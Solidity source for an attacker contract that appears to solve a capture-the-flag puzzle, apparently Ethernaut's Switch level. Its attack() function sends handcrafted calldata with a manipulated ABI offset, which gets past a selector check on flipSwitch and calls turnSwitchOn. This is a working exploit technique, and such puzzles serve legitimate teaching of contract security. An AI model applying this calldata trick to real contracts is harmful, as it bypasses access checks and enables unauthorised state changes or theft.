// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol"; // Remix 现在也支持这个语法

contract SwitchAttacker{
    event DebugCalldata(bytes data);

    bool public switchOn= true; // switch is off

    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    address switchAddr ;
    constructor(address _switchAddr){
        switchAddr = _switchAddr;
    }
    
    function turnOn() external{
        ISwitch(switchAddr).turnSwitchOn();
    }

    function turnOff() external{
        ISwitch(switchAddr).turnSwitchOff();
    }

    function attack() external returns(bool){
        bytes memory _calldata = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        emit DebugCalldata(_calldata);
        (bool success,) = address(switchAddr).call(_calldata);
        return success;
    }
    
}
interface ISwitch {
        function turnSwitchOn() external;
        function turnSwitchOff() external  ;
        function flipSwitch(bytes memory _data) external  ;
}